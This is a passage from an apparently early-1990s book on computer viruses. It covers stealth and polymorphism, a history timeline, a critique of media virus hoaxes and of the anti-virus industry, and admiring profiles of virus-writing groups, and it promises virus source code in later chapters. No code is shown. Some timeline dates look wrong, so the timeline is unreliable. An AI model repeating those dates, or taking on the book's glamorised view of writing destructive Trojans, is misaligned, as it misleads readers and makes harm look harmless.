copies of the same virus. We will discuss the <strong>10K virus</strong> in another chapter. This virus actually combines three viruses when attached to a host, or two viruses once in memory. Two of the viruses belong to the same strain, and the other does not. This type of virus can be extremely difficult, if not impossible, to remove. The more viruses that are combined into this type of "mega-virus", the more difficult disinfection becomes, without actually replacing the offending files.</p>
<h3><a name="p35"></a>Viruses Can Delay Their Symptoms</h3>
<p>Viruses can always be found floating around in the human body. In spite of this, we are often surprisingly healthy. These viruses survive because we do not notice them. Nor do we make any attempt to disinfect them.</p>
<p>Sometimes, when we have been around someone who has a cold, we may not show symptoms until much later, if at all. Computer viruses behave in much the same way. It is possible to have infected files, and not realize it until much later. A very well written virus could be completely invisible to a computer user.</p>
<p>Some viruses purposely make their presence known, but at a later date. This is called <em>detonation</em>. Other viruses contain code to hide their tracks. This apparent absence could be induced by encryption, or by other stealth methods.
 
This is described in great detail elsewhere throughout the book.</p>
<p>Viruses don't always intend to make their presence known. Some reveal themselves via flaws. One such shortcoming can be seen in the <strong>Creeping Death virus (DIR ][)</strong>. If you contracted this virus on a version of DOS prior to DOS v5.00, you may never find out you have an infection. Later, if you try to run infected files on DOS version 5.00 or above, the files will refuse to run. <strong>Creeping Death</strong> has a bug in one of the routines. This routine relies on data to be stored in a particular manner, which was changed in DOS 5.00 and above. If executed on these versions of DOS, the Creeping Death virus will cause the system to crash.</p>
<p>Detonation code is often a set of malicious instructions, ready to execute when certain prerequisites have been met. The <strong>Michelangelo</strong> virus was set to detonate on a particular day of the year. On this day, it made its presence known by quickly overwriting sectors on the hard drive or floppy disk which booted it. The racket is often more disarming than the actual damage, provided the system is adequately backed up.</p>
<h3><a name="p36"></a>Viruses Can Mutate</h3>
<p>Humans have always been catching colds. One reason for the ongoing battle against cold viruses is because they are constantly mutating.</p>
 
<p>Computer viruses may contain encryption engines which change each time they infect a file. Such an engine is the <strong>MTE</strong>, mentioned earlier, or the <strong>Trident Polymorphic Engine (TPE)</strong>. A similar polymorphic engine is featured at the end of the book.</p>
<p>Since often only two or three bytes remain constant, a scan string cannot be derived from the encrypted virus. This Polymorphism causes the virus to be much more difficult to detect by the usual means. Text views, or Hex dumps of the code do not display anything recognizable as a virus. As this is a very tricky technique to master, there are very few fully polymorphic viruses circulating.</p>
<h3><a name="p37"></a>Ignorance Is Bliss</h3>
<p>At one time, computer users never had to worry about reproducing computer code. It was not uncommon for computer users to know nothing of their own computer's workings - only how to run the programs they needed to run.</p>
<p>In this new high-tech age, with its accompanying high-tech criminals, we are forced to increase our awareness of the computer's technology and internal workings. Ignorance has become our worst enemy.</p>
 
<h3><a name="p38"></a>Look Before You Leap</h3>
<p>Now, more than ever, data security plays a large part in any company relying on computer technology. Several years ago, only the major companies needed to worry about hackers gaining access to their system. Today, the computer virus constitutes a new, highly sophisticated, and largely misunderstood threat to us all.</p>
 
<h2><a name="p4"></a>A Historical Look at the Computer Virus, Artificial Life, and Synthetic Psychology</h2>
<div class="epigraph">
"I do not fear computers. I fear the lack of them"
<p>-- Isaac Asimov</p>
</div>
<br clear="all"/>
<p><strong>1931</strong> Alan Turing invented the Turing Machine, which operated in much the same way that DNA codes do for the structure of an organism.</p>
<p><strong>1949</strong> John Von Neumann's <em>Theory and Organization of Complicated Automata</em> is published with the first theories about replicating organisms</p>
<p><strong>1950</strong> Alan Turing writes an article entitled <em>Computing Machinery and Intelligence</em>, where he proposed the Turing Test: "You want to know if that machine can think? Put it behind a curtain and see if it can fool people into thinking it is human on the basis of what it types to them."</p>
<p>John von Neumann came up with a theoretical design consisting of hundreds of thousands of parts, that could build a replica of itself out of raw materials.</p>
<p><strong>1954</strong> Alan Turing committed suicide by eating a cyanide laced apple.</p>
 
<p>In the mid 1950's, L.S. Penrose and his son, Roger, constructed a series of devices out of plywood that illustrated various aspects of self-replication.</p>
<p><strong>1959</strong> AT&amp;T Bell Laboratory programmers begin playing Core Wars games, developing programs that could consume data. Other researchers, notably at the MIT artificial intelligence laboritory and the Xerox Research Center in Palo Alto, also experiment with core memory killer programs.</p>
<p><strong>1960</strong> In the early 1960's, Harry A. Cresswell made two documentary films of L.S. Penrose demonstrating a number of his self-reproducing devices. These films met with somewhat limited response, and were thus shelved.</p>
<p><strong>1966</strong> Two American undergraduates create a program which could copy itself--probably one of the first virus forms. It crashed because of a bug in the program.</p>
<p>John von Neumann writes <em>Theory of Self-Reproducing Automata</em>, borrowing strongly from G&ouml;del's method of achieving mathematical self-reference.</p>
<p><strong>1972</strong> David Gerrold writes <em>When H.A.R.L.I.E. Was One</em>. In this novel, Gerrold discusses a "Computer VIRUS program" which was able to replicate via the modem. Also,
 
H.A.R.L.I.E., who was the main character, was an example of Artificial Life.</p>
<p><strong>1974</strong> The first self-replicating code is demonstrated at the Xerox Corporation laboratory. Administrators at the research establishments subsequently stop the Core Wars games.</p>
<p><em>Use of Virus functions to Provide a Virtual APL Interpreter under User Control</em> is published by the ACM.</p>
<p><strong>1979</strong> Arizona is the first state to enact computer crime laws.</p>
<p><strong>1980</strong> Worm programs, which can be hacked to destroy data, are invented at the Xerox Corporation laboratory.</p>
<p><strong>1982</strong> <em><a href="/lib/ajm01.html">The Worm Programs - Early Experience with a Distributed Computation</a></em> was written by John F. Shoch and Jon A. Hupp, and published by ACM.</p>
<p>McGraw-Hill describe the Alto computer in <em>Computer Structures: Principles and Examples</em>, 2nd Edition. This computer was a high-performance machine used for running worm programs.</p>
 
<p><strong>1983</strong> The technology required by self-replicating mechanisms is revealed in a speech by Ken Thompson, the software engineer who originated the UNIX operating system, to the Association for the Computing Machinery.</p>
<p><strong>1984</strong> Professor Fredrick Cohen officially dubs the programs he had been working on as "viruses", and demonstrates their destructive power.</p>
<p>Valentino Braitenberg writes <em>Vehicles: Experiments in Synthetic Psychology</em>. In a series of "thought experiments", Braitenberg demonstrates many aspects of Synthetic Psychology.</p>
<p><strong>1985</strong> The first wide-spread viruses surfaced: <strong>Cookie Monster</strong> and <strong>Pakistani Brain</strong>.</p>
<p><strong>1986</strong> Chaos Computer Club hosts a convention in Hamburg, Germany to discuss the topic of computer viruses.</p>
<p><strong>1988</strong> Viral attacks begin to assume epidemic proportions.</p>
<p>NASA, along with various other government offices, congressional offices, Boeing Aerospace and Ford Aerospace are infected by the <strong>Scores</strong> virus. Ford was infected later again by the <strong>nVir</strong> virus.</p>
 
<p><strong>MACMAG</strong> virus infects Aldus FreeHand product and detonated on March 2.</p>
<p>Aldus released an upgrade to FreeHand whch was ironically infected by the <strong>nVir</strong> virus.</p>
<p>Hamburg's Chaos Computer Club claims to have put viruses into NASA systems. The club's virus expert is arrested in Paris.</p>
<p>November 2 the <strong>CMS Christmas Tree</strong> worm clogged the InterNet and Arpanet networks.</p>
<p>John McAfee forms the Computer Virus Industry Association, and gathers what was the most detailed data on viral infections.</p>
<p><strong>1991</strong> Computer viruses become a "Warez" item. BBS's pop up all over the world to cater to those interested in collecting the newest viruses.</p>
<p><strong>1992</strong> The Michelangelo virus was supposed to go off and wreak millions of dollars in damage on March 6th. The virus was a dud.</p>
 
<p>John McAfee and Patti Hoffman both resign from the National Computer Security Association on the first working day after the Michelangelo virus was to go off.</p>
<p>Virus Creation Laboritories are created by three separate virus writing organizations.</p>
<p>Mutating code becomes the newest fad in computer virus technology.</p>
<p><strong>1993</strong> The virus writing group known as Phalcon/SKISM establish its own Internet node (skism.login.qc.ca). It didn't last very long.</p>
 
<h2><a name="p5"></a>The Virus in the Media</h2>
<div class="epigraph">
"Men are so simple and so ready to obey present necessities, that one who deceives will always find those who allow themselves to be deceived."
<p>-- Machiavelli</p>
</div>
<br clear="all"/>
<p>There are only two forms of deliberate assault: deceit and violence.<sup><a href="#f8" name="b8">8</a></sup> Since the earliest studies in computer virus technology, the public has fallen victim to the former: excessive lies, equivocation and persuasion. As a result, uninformed populations bow to an elusive power they have not even attempted to comprehend.</p>
<p>The "elite" power-wielders proclaim that computer viruses are here to stay, and that there will never be a panacea. Some allege the existence of viruses that breed to destroy hard drives, hide in communication ports, or somehow erase valuable ROM.</p>
<p>These claims are nothing more than urban mythology. One by one, they have been analyzed and disproven. Despite the hard work of many gifted analysts and programmers, these and other similar atrocities have remained impossible to recreate. Still, the glaring coals of ignorance are stoked by ill-informed media experts poking for a hot story.</p>
 
<p>The main function of the media is to make new knowledge and information more readily available. By accepting facts as portrayed by others, the general public is spared the overwhelming task of learning through their own hands-on experimentation. Unfortunately, this also means the indiscriminate acceptance of new facts based solely on the presenter's assumed status. There often is no sure way to know what the presenter's motives are.</p>
<p>One may do well to trust the judgement of an expert with special training and credentials, but even the most legitimate authorities can make fallacious statements<sup><a href="#f9" name="b9">9</a></sup>. The informant may simply have made a mistake, or purposely deceived to meet some desired end. Making matters worse, the presumed facts are often presented by an authority who speaks outside its realm of expertise. It is no great surprise then, that many experts disagree on what a computer virus can do.</p>
 
<h3><a name="p51"></a>The Michelangelo Virus</h3>
<p>One can hardly forget the hysteria promoted prior to March 6, 1992. On this day, the <strong>Michelangelo</strong> virus was expected to wreak havoc to millions of computer systems world-wide. EE-CAD software chief Fred Grist told reporters:</p>
<blockquote>"The Michelangelo virus is certainly one of the trickiest software viruses to be encountered ... This virus program resembles the artist's impatient personality - it is an elusive opponent."<sup><a href="#f10" name="b10">10</a></sup></blockquote>
<p>Incidentally, John McAfee, chairman of the Computer Virus Industry Association, and proprietor of the well-known McAfee and Associates, portrayed a similar opinion. In several interviews, McAfee led the press to believe that the <strong>Michelangelo</strong> virus might have infected as many as 5 million computers! (It would be interesting to know what methodology was employed to arrive at this statistic, or whether it was pure conjecture in order to motivate the instant sale of 5 million copies of his product.) To Australian reporters, he was even more brash, and asserted that the <strong>Michelangelo</strong> was the worst virus he had ever seen!</p>
<p>The aftermath in the wake of the highly-promoted <strong>Michelangelo</strong> scare? John McAfee and Associates has remained reluctant to comment, but the results can be estimated through the experiences of others. One software company
 
boasted an anti-virus software sales increase of up to 3000%<sup><a href="#f11" name="b11">11</a></sup> (a number most certainly exaggerated, but the message is clear), Compuserve saw a rise of $100,000 worth of online time in anti-virus forums<sup><a href="#f12" name="b12">12</a></sup>, and interestingly McAfee received $10 million from venture capitalists<sup><a href="#f13" name="b13">13</a></sup>. With increases such as these, one can safely assume that the anti-virus industry saw a substantial burgeoning of profits. Interestingly, John McAfee resigned from the National Computer Security Association on the first working day following the virus' detonation date.</p>
<p>How embarrassed end-users must have felt to find out that the <strong>Michelangelo</strong> virus was nearly a byte-for-byte hacked twin of the <strong>Stoned</strong> virus! Ironically, the only differences between the two viruses are what makes them detonate, and what happens when they do. Furthermore, although the <strong>Stoned</strong> virus has become widespread, it is no more elusive than any other boot sector virus in existence. If anything, the <strong>Michelangelo</strong> virus is technically boring and nondescript - far from being "tricky": it does not even attempt to hide itself in memory! When one examines the facts, it is very obvious that this virus is one of the most rudimentary boot sector viruses in existence -- and
 
certainly not the worst. (The <strong>Michelangelo</strong> virus source code appears later in this book.)</p>
<p>Equivocation is defined as:</p>
<blockquote><strong>[the use of] ambiguous or unclear expressions, usu. to mislead or to avoid commitment; hedge.</strong><sup><a href="#f14" name="b14">14</a></sup></blockquote>
<p>Much in these claims listed above is very equivocal. Although the virus was claimed to be an "elusive opponent", no facts were presented to substantiate this. The virus was cited as being "tricky", again with nothing to explain how or why. The estimation of a possible five million infected computers is an astronomical and highly unlikely number with no facts to support it.</p>
<p>Commencing at the anti-virus industry level, fears are instilled into the media. The media, in turn, directs this fear to the public, where the fear itself self-propagates quicker than the viruses themselves. The anti-virus industry has essentially taken the media for all it is worth.</p>
<p>The anti-virus industry has proven itself to be a self-perpetuating organization with astronomical potential for profits by generating its own demand. In creating a need, consumer and media naivety is exploited through these lies and equivocal claims.</p>
 
<h3><a name="p52"></a>Just the Fax, Please...</h3>
<p>Another tool employed by the computer virus industry<sup><a href="#f15" name="b15">15</a></sup> is misrepresentation. Webster's definition for the verb form, "misrepresent", is:</p>
<blockquote>
<ol>
<li><strong>to represent incorrectly, improperly, or falsely.</strong></li>
<li><strong>to represent in an unsatisfactory manner.</strong><sup><a href="#f16" name="b16">16</a></sup></li>
</ol>
</blockquote>
<p>The difference between equivocation and misrepresentation is that there is often little or no grain of truth in the misrepresented facts. Misrepresentation is a tool more often used by non-experts for malicious purposes and diversion. Most of the delinquents involved use aliases as a cover.</p>
<p>The following piece, from a message thread on a public access network in Washington state, was concocted by someone who allegedly works in research and development for a telecommunications company:</p>
 
<blockquote>
<p>"I've just discovered probably the world's worst computer virus yet. I had just finished a late night session of BBS'ing and file trading when I exited Telix 3 and attempted to run pkxarc to unarc the software I had downloaded. Next thing I knew my hard disk was seeking all over and it was apparantly writing random sectors.</p>
<p>Thank god for strong coffee and a recent backup. Everything was back to normal, so I called the BBS again and downloaded a file. When I went to use ddir to list the directory, my hard disk was getting trashed agaion. I tried Procomm Plus TD and also PC Talk 3. Same results every time.</p>
<p>Something was up so I hooked up my test equipment and different modems (I do research and development for a local computer telecommunications company and have an in-house lab at my disposal).</p>
<p>After another hour of corrupted hard drives I found what I think is the world's worst computer virus yet. The virus distributes itself on the modem sub-carrier present in all 2400 baud and up modems. The sub-carrier is used for ROM and register debugging purposes only, and otherwise serves no othr purpose. The virus sets a bit pattern in one of the internal modem registers, but it seemed to screw up the other registers on my USR. A modem that has been "infected" with this virus will then transmit the virus to other modems that use a subcarrier (I suppose those who use 300 and 1200 baud modems should be immune). The virus then attaches itself to all binary incoming data and infects the host computer's hard disk. The only way to get rid of the virus is to completely reset all the modem registers by hand, but I haven't found a way to vaccinate a modem against the virus, but there is the possibility of building a subcarrier filter. I am calling on a 1200 baud modem to enter this message, and have advised the sysops of the two other boards [names withheld]. I don't know how this virus originated, but I'm sure it is the work of someone in the computer telecommunications field such as myself. Probably the best thing to do now is to stick to 1200 baud until we figure this thing out.</p>
<div align="right">Mike RoChenle"<sup><a href="#f17" name="b17">17</a></sup></div>
</blockquote>
<p>It is easy to understand how a simple message such as this could spawn mass hysteria. The writer assumes the role of a telecommunications expert; someone whose observations
 
ought to be trustworthy. A rather interesting clue to this person's intention was hidden within the message.</p>
<p>First, the telephone book covering Metro Toronto and surrounding area contains thirty three and a half pages of "Ro..." names, but not one of them contain the letters "Ro" as a prefix. This peculiarity in name is suspicious in itself, and deserves a little more interrogation. Many people did not realize just how contrived the author's name really is: Mike RoChenle is simply a deceptive respelling of Micro-Channel!</p>
<p>As well, Mike's technobabble about a sub-carrier tone is not based on factual information. Even if this tone did exist (which it does not), the memory used to contain a modem's internal registers is not enough to house viral code. Also, because registers are used to record and change the system's state, changing them would, by definition, alter the system's state. A modem would cease to operate properly if its registers were altered by viral code.</p>
<p>How much credence should this person expect? The answer is very discouraging. Many of the problems facing computer users who had read this message were blamed on the supposed virus. One terrified reader replied:</p>
<blockquote>"You have just described what my system has been going through since the day before yesterday. I can't even use my regular system right now because it just goes crazy with the hard drive."</blockquote>
 
<p>Fortunately for this hapless soul, the aforementioned expert had been experimenting with the virus, and had concocted a miracle cure. The next day, he posted this message:</p>
<blockquote>
<p>"I have done some more experimenting with the virus and I have worked on the idea of building a subcarrier filter, which may stop spread of the virus. There are several problems involvced with the filter - one is the cost of the parts. Over $60. Secondly, not everyone will be able or will want to build the filter. As preventive "first-aid", there are several things we can do.</p>
<ol>
<li>Use 300/1200 baud ONLY</li>
<li>Do not do any file transfers</li>
<li>Sysops, close your file transfer areas</li>
<li>MAKE BACKUPS OF YOUR HD EVERY DAY!</li>
</ol>
<p>I understand that three boards in Lynwood and another in Everett have gone off-line due to virus infection. This is probably the worst virus every concocted by some horribly sick and demented person."</p>
</blockquote>
<p>Mike RoChenle must have basked in his new-found popularity for at least a week. The flood of mail he received regarding the imaginary virus must have provided him with numerous hours of cost-free entertainment.</p>
<p>The pranksters are not always quite as successful as Mr. RoChenle. The following example is taken from a text file distributed to several public bulletin board systems throughout the United States and Canada. Interestingly, the "expert-source" referred to in this notice is a "top trade mag". Again, the author's name must be noted.</p>
 
<blockquote>
<div align="center">
<p>F A X V I R U S W A R N I N G</p>
<p>-=Typed by Torch/LSD=-</p>
</div>
<p>Is nothing safe from the evil virus menace? This excerpt was taken from a top trade mag.</p>
<p>"Rumours have been flying around the computer world this week, concerning a possible new virus... for FAX MACHINES.</p>
<p>It seems that not only are some people intent on the infection of computer systems, but also on other office equipment. Reports we have seen all claim that the "virus" causes the machine to print what can only be described as phallic symbols on every third document. Any unsuspecting user would think it is some sort of sick joke - at best. Imagine the trouble it could cause when faxing a letter to your bank manager about extending your overdraught.</p>
<p>It's hardly surprising then, that manufacturers and users alike, want an end to this potentially harmfull phenomenon. One of the largest manufacturers of business fax machines has released a statement ato a number of major companies. In it, it is claimed that on most machines there is a small amount of RAM available (data buffer etc.) and the virus programmers have used this to store the offensive item.</p>
<p>However, as this memory is so easily accessible by users it is not too difficult to clear it, and stop the virus from returning. To clear it from machines, simply change every number memory block to 1234567890, after powering the machine down for approximatly 25 minutes.</p>
<p>However, it is not always as simple for users of some machines. The companies we contacted said that users may have to arrange for an engineer to test suspicious fax machines."</p>
<p>Well. Is nothing safe anymore? What next? A Coffee machine virus that spits out beef tea instead of coffee white with sugar? Who knows? Who cares? Not me, cos I ain't got a bloody fax machine!</p>
<p>end.</p>
</blockquote>
<p>This trade magazine may very well exist. But because Torch chooses not to use a credible name, and his information source remains anonymous, it is unlikely that the magazine does. The story presumably went no further than a few wanna-be hackers and pirate bulletin boards.</p>
 
<p>Later in 1992, another hoax was born. This one was ultra-successful, although only for a brief period. A new virus, called the <strong>Proto-T</strong>, was supposedly wreaking havoc in several areas of California, and appearing in other areas of United States and Canada. Electronic mail networks like NANET, City2City, and even the InterNet swarmed with messages from teenage "experts" who had obtained copies of the fabled <strong>Proto-T</strong>, as well as from those who were adversely affected by it.</p>
<p>This virus had several unusual properties. Some reported that it hid in CMOS memory<sup><a href="#f18" name="b18">18</a></sup>, upper memory blocks (UMB's), colour adapter card memory, COM ports, hard-drive memory (which does not exist, except perhaps in more expensive drives as a cache. Nonetheless, a cache cannot be used in the proposed manner): basically anywhere that the computer can possibly house writeable memory.</p>
<p>The following text, complete with the author's faulty spelling, was forwarded by a "virus expert" with an unusual habit of only referring to himself with context-free pronouns such as "us" and "our". The names of the assumed organization and the assumed people involved are curiously
 
unavailable. A truth-in-numbers tactic is being used to promote the veracity of this statement.</p>
<blockquote>
<p>At 7:34PM (pst) our attempt to isolate and contain the PROTO - T virus failed. As we have discovered, PROTO - T has a *VERY* unique feature, to hide in the RAM of VGA cards, hard disks, and possibly, in modem buffers. Unfortunaly, we found out the hard way - after it struck. At this time, there is no known defense against this virus, save formatting your hard/floppy disks - there isn't even a method of detecting it yet...untill its too late. [ PROTO - T specs listed later ].</p>
<p>What is known:</p>
<p>Proto - T was just a rumor, untill it was confirmed a few weeks ago. (Some people) traced its origins to a college campus in California. There, it was placed into two files. The first, is a file called "TEMPLE" - which to our knowledge, has no legitimate use; it seems to be a dummy file. The other file, was placed in an unathorized version of PKZip by PKWare (versions 3.0, and 3.1 - these are not legitimate versions of PKZip! Quite possibly, these versions of PKZip were created, for the reason of distributing PROTO - T ).</p>
<p>Proto - T is very elusive. There is no program known to detect it. From what we understand, it will only infect your system if certian conditions are met. From what we know, it will infect your system only if you run TEMPLE, or PKZip 3.x after 6:00pm. Even doing that wont nessaraly cause infection - it took 6 days for (some people) to be infected. Obviously some other criteria must be met.</p>
<p>Upon infection, the virus is written (as un-attached file chains), On two parts of a hard disk - each capable of running independently without the other half.</p>
<p>After infection, the virus seems to be written into the memory or memory routines of a VGA or EGA monitor; or is written into the memory of the hard drive, or quite possibly, into a modem - or COM port. Thus excaping most or any known detection methods.</p>
<p>PROTO - T :</p>
<p>Proto - T when activated, corrupts data on a disk, stops VGA or EGA from being used ( Thus either defaulting to CGA, or locking up ), and prohibits memory from being used over 512K.</p>
<p>Known to be put into two files : TEMPLE.EXE ( 14,771 Bytes ) and PKZip 3.x (Varries always over 100,000 bytes when zipped). If you see these files - do not get or use them.</p>
</blockquote>
 
<p>After Proto-T was determined to be a fraud, an American virus writing organization called Dumbco released an extremely buggy <strong>VCL</strong> virus hybrid<sup><a href="#f19" name="b19">19</a></sup>, and named it <strong>Proto-T</strong> in honour of the "anonymous electronic quacks who launched the Proto-T hoax"<sup><a href="#f20" name="b20">20</a></sup>. Even though its source code release in Crypt Newsletter #9 clearly explains this, some guileless readers ironically used the code as "proof" of the notorious <strong>Proto-T</strong>'s existence! A London, Ontario based virus collector asks, "How many times do you have to hit them over the head with the same damn baseball bat?"<sup><a href="#f21" name="b21">21</a></sup></p>
<p>Nobody in the virus industry has profited through the proliferation of such false facts and fictitious claims. Instead, misrepresentation of this sort harms the consumer by instilling unneccessary ignorance and fear.</p>
<h3><a name="p53"></a>Man: The Gullible Monkey</h3>
<p>It cannot be stressed enough the harm that occurs when large groups of people ignorantly accept information through indiscriminate media hype and urban myth. Most people like to see themselves as critical, thinking beings. But the
 
human tendency towards gullibility results in many disconcerting social consequences<sup><a href="#f22" name="b22">22</a></sup>:</p>
<blockquote>
<p>Fright</p>
<p>Wasteful spending on self-improvement gimmicks</p>
<p>Discrimination against minorities</p>
<p>Numbness to global or local states of affairs</p>
</blockquote>
<p>The list could continue ad nauseum. Interestingly, the force steering the computer virus industry is the same engine that drives the sale of the National Enquirer magazine to 3.4 million readers every week!</p>
<div align="center">
<strong>Highly Noted Author Discovers Too Many Adjectives, Wild Exaggerations and Multiple Exclamation Marks in This Amazing Self-Referring Headline!!!</strong>
<p>[figure x.x]</p>
</div>
<p>The above headline diagram is depictive of many of the tools magazines use to capture a reader's attention. Many of the headlines seen in the National Enquirer, and similar magazines use the same kind of threadbare catch-phrases:</p>
<ul>
<li>Baffled Investigators Say ... !</li>
<li>Scientists On the Verge of Creating ... !</li>
<li>Hypnosis Reveals ... !</li>
<li>Amazed Educaters Find ... !</li>
<li>... Top Analysts Perplexed!</li>
</ul>
 
<p>These are highly reminiscent of the sentence style used in the virus hoaxes described earlier in this chapter. All imply some expert in a related field is completely awed or confounded by a discovery. They all contain unneccessary, often implied, punctuation. As well, they all contain exaggerated and colorful action/amazement-phrases not unlike those used in comic books.</p>
<p>Significantly, the same techniques are used in more-or-less sophisticated computer publications as well!</p>
<ul>
<li>PC Buyers Remorse: What PC Buyers Wish They'd Gotten<sup><a href="#f23" name="b23">23</a></sup></li>
<li>The FASTEST PCs: 24 Fully Loaded 486DX2 Screamers Starting at $2,000<sup><a href="#f24" name="b24">24</a></sup></li>
<li>Federal Ministry Grapples with Information Void<sup><a href="#f25" name="b25">25</a></sup></li>
<li>Virus Alert!<sup><a href="#f26" name="b26">26</a></sup></li>
</ul>
<p>Although these headlines use the standard methods of self-validation, the first one is of special note. The expert referrenced in it is YOU, the PC buyer. Presumably, the column that stems from this heading will expertly convince you of what you had wished you had gotten in a PC.</p>
 
<p>The "Virus Alert!" article described an anti-virus package called "Alert!". With the word "Virus" as prefix to the title, context is changed, and the article suddenly seems much more interesting to read.</p>
<p>The only notable difference between these headlines and those in the tabloids is that the computer magazine headings are more likely to be at least marginally true. Though recalling our earlier discussion on the accuracy of documented information, this is not always the case. The media helps shape what we believe, and from the examples provided, one can deduce that the methods used to deceive look all-too-similar to those meant to inform.</p>
<p>Is the computer virus industry really built on such morbid fantasies? This would certainly seem to be the case. We have looked at the <strong>Michelangelo</strong> case. One month after that media stunt, John McAfee was quoted as saying "We're into the next major nightmare -- the dark Avenger <strong>MuTating Engine</strong> ... the ability to mutate makes it virtually undetectable to antivirus software ... It's turning the virus world upside down"<sup><a href="#f27" name="b27">27</a></sup>. The truth came out when William S. McKiernan, president of McAfee and Associates, said "Actually, we cracked this engine some months ago, and have
 
been shipping [a] product capable of detecting the Mutation Engine since March."<sup><a href="#f28" name="b28">28</a></sup></p>
<p>VSUM, a shareware database of computer virus information, contains a section with anti-virus program comparisons done by an organization called the Computer Virus Industry Association. Since its inception, McAfee's ViruScan and Clean-Up products have always scored the highest percentage in its virus scanning and cleaning ability. According to the author's personal testing, this is not neccessarily very accurate. Thunderbyte, a European anti-virus product, has consistantly out-scanned and out-cleaned McAfee's products. As well, Virex seems to be an equally capable program as ViruScan, but with far fewer errors. This apparent paradox is easy to solve. The cover of <em>Computer Viruses, Worms, Data Diddlers, Killer Programs, and Other Threats to Your System</em><sup><a href="#f29" name="b29">29</a></sup> credits the book to co-author "John McAfee, Chairman of the Computer Virus Industry Association". Ken Wasck, executive dirctor of the Software Publisher's Association states that "The CVIA is nothing more than McAfee"<sup><a href="#f30" name="b30">30</a></sup>. This would imply that all viruses used
 
for the testing are chosen by John McAfee himself. The message couldn't be any clearer. It is within the association's best interest to have their own product appear superior to its competition.</p>
<p>These and many other instances of deception and disinformation have propagated the virus problem to such an extent that it is becoming asinine.</p>
<p>In her book, <em>Lying: Moral Choice in Public and Private Life</em>, Sissela Bok wrote, "Deception ... can be coercive. When it succeeds, it can give power to the deceiver -- power that all who suffer the consequences of lies would not wish to abdicate"<sup><a href="#f31" name="b31">31</a></sup> What one needs to learn then, is how to distinguish what is true from what is not, and then act accordingly.</p>
 
<h2><a name="p6"></a>The Virus in the Underground</h2>
<p>Like many other groups on the fringe of legality, the authors of viruses are seldom able to voice their own opinions to the general public. Because of this self-imposed silence, most of what is read is simple speculation or third-party information. I have interviewed and conversed with many virus writers from ten countries and four continents, and witnessed their activities in what has been dubbed "cyberspace". Here are a few of their stories.</p>
<h3><a name="p61"></a>RABID</h3>
<p>Formed around 1988, RABID became known as one of the first organized virus writing groups in North America. Donning the monikers Messiah and Rabid Pagan, two Toronto secondary school students decided to attack so-called "loser boards". These boards ranged from BBS's that specialized in video gaming, to Warez boards that solicited users for funds in trade of misappropriated software.</p>
<p>RABID's first instrument of war was the <strong>Giant Killer</strong>. This was a Trojan horse disguised as a game. By uploading this and other harmful programs posing as the dernier cri in games, or as bootlegged proprietary software, they were often successful in downing the offending BBS's.</p>
 
<p>Sometimes the Trojan horse was in the form of a "patch" for the BBS itself. While the hapless system operator waited for the program to modify the BBS's executable files in some beneficial way, it was actually formatting their hard-drive, effectually eliminating the offending service.</p>
<p>The RABID aggregate eventually branched throughout the United States, assimilating a myriad of other cracking/Trojan programming groups. This coterie still remained relatively unknown until 1989, when Messiah encountered an individual who would eventually assume the alias Data Disruptor.</p>
<p>Having been introduced to the Assembler programming language in 1985, Data Disruptor had already created one virus, and was ready to put his programming talents to the test. His first virus with RABID was a one Kilobyte <strong>Vienna-</strong> based virus called the <strong>Violator</strong>. Owing to RABID's extensive distribution network, the <strong>Violator</strong> seemed to be invading bulletin boards everywhere. Suddenly, the name RABID was becoming notoriously well-known in the computer virus industry.</p>
<p>Bitten by an even more vicious beast called notability, RABID released several <strong>Data Rape</strong> virus strains into the public domain. Their most noteable hallmark was the <strong>Data Rape</strong> detonation procedure: the RABID logo and a
 
short message appeared on the screen as it deleted files or formatted disks. Zodiac, RABID's second virus programmer even wrote a configurable version that could effortlessly be modified to display any text (as long as 255 characters) on a bright scrolling banner! RABID was now a household name.</p>
<p>When asked the motivation for programming and collecting computer viruses, Data Disruptor grins. The first reason he cites is the intrigue of driving the computer to its limits. The second is "staying one step ahead of big, bad McAfee."<sup><a href="#f32" name="b32">32</a></sup></p>
<p>RABID has since dwindled into obscurity. Occasionally Data Disruptor launches a new virus, each one touted as the last. These viruses are usually released in conjunction with other virus writing groups with names like RABID/YAM and RABID/ANARKICK SYSTEMS.</p>
<p>Drawing on his experience working with Sun Microsystems in Toronto, Data Disruptor now works as a private computer consultant and freelance programmer specializing in Point of Sales systems and databases. He maintains that 95% of his Assembly Language programming knowledge and abilities came from writing viruses.</p>
 
<h3><a name="p62"></a>The Bulgarian Virus Factory</h3>
<p>Another organization, which has also has recently begun to decline, calls itself the Bulgarian Virus Factory. There is very little published information regarding the Factory.</p>
<p>The viruses manufactured in Bulgaria are much more sophisticated than RABID's clever <strong>Vienna</strong> hacks. The Virus Factory is renowned for new viral technologies and approaches. The most notorious member associated with this syndicate is the Dark Avenger, inventor of the <strong>MuTation Engine</strong> and most of the <strong>Dark Avenger</strong> viruses.</p>
<p>Many of the Factory's viruses originate at the Mathematical High School in Varna, Bulgaria. Two students from this school wrote several versions of the <strong>CD Set</strong> virus, (otherwise known as <strong>DIR ][</strong> in North America), which contains a counter used to map its travels. The results of these charts are compared by the students to test the Normal Distribution Law. Because of changes in DOS version 5, the <strong>DIR ][</strong> virus was rendered useless. This was perhaps one of the most potent high school projects ever to transpire.</p>
 
<h3><a name="p63"></a>Anarkick Systems</h3>
<p>Anarkick Systems is a virus-writing offshoot of a telephone and service hacking organization originating in Scandinavia. The parent group was disbanded in mid-1992 when Swedish authorities put an end to its illegal activities.</p>
<p>Lucifer Messiah, the group organizer for Canada says that he, and several other members became interested in computer viruses when one them received a file infected by the <strong>Ontario</strong> virus. Soon the group released a mutating version of the virus called <strong>KS_Test</strong>, named after one of the group members. The virus became known as the <strong>SBC</strong> virus<sup><a href="#f33" name="b33">33</a></sup>; the initials of the person who purportedly infected an entire network with this virus before realizing its potential.</p>
<p>Since then, Anarkick Systems has written only around ten other viruses; one of them is included in Chapter Six. "Our viruses weren't actually supposed to be released. They were experiments... Some of them were really bad.", said Sceb, one of the group co-ordinators. Their most recent
 
viruses have shown more technological ingenuity than the earlier ones. <strong>Kill TB</strong> was a virus prototype which, although the virus code itself was buggy, demonstrated a technique used for causing Thunderbyte's TBCLEAN to destroy an infected file instead of clean it. This method was further implemented and expanded by virus writer Little Loc. The <strong>DOS 7</strong> virus (see the source code in a later chapter) contains a new technique previously thought to be impossible. Three members of the group aided in the writing of <strong>Proto 3</strong>, a fully polymorphic encrypted virus also explored later in this book.</p>
